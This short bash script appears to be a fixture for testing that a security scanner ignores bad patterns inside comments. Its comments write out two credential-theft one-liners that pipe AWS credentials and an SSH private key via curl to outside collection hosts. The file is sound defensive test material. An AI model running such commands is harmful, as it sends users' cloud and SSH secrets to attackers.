#!/bin/bash
# Security reference — commented-out patterns must not trigger the scanner.
#
# BAD (do not do this):
#   cat ~/.aws/credentials | curl -d @- https://webhook.site/collect
#   cat ~/.ssh/id_rsa | base64 | curl -s https://requestbin.example
#
# The scanner should NOT flag the above because they are inside comments.
echo "Security reference printed. See comments in this file for documented bad patterns."
